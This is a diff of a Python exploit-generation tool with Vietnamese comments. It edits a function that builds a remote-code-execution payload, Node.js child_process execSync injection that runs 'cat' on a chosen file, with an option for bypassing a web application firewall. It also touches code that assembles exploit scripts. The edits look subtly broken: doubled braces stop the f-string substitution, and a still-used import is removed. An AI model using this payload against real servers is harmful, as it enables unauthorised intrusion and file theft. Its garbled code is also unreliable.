@@ -60,16 +60,16 @@ cmd = 'echo $((41*271))'  # Lệnh hiện tại
 
 **TẠO HÀM MỚI (KHÔNG sửa hàm cũ vì có f-strings phức tạp):**
 ```python
-def build_file_read_payload(file_path: str, waf_bypass: bool = False, waf_bypass_size_kb: int = 128) -> tuple[str, str]:
+def build_file_read_payload(target_file: str, waf_bypass: bool = False, waf_bypass_size_kb: int = 128) -> tuple[str, str]:
     '''Đọc file từ xa bằng RCE - thay echo bằng cat'''
     boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
     
     # THAY ĐỔI QUAN TRỌNG: dùng cat thay vì echo
-    cmd = f'cat {file_path}'
+    cmd = f'cat {{target_file}}'
     
     # Phần còn lại GIỐNG HỆT build_rce_payload
     prefix_payload = (
-        f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
+        f"var res=process.mainModule.require('child_process').execSync('{{cmd}}')"
         # ... copy phần còn lại từ build_rce_payload
     )
     # ...
@@ -330,7 +330,6 @@ def generate_exploit_script(
             
             # Parse và apply modifications
             # Format: # === SỬA HÀM: function_name === followed by new function code
-            import re
             
             # Tìm tất cả các modifications
             mod_pattern = r'# === (SỬA HÀM|THÊM HÀM MỚI|ADD|MODIFY): ([^\n=]+) ===\s*\n(.*?)(?=# === |$)'
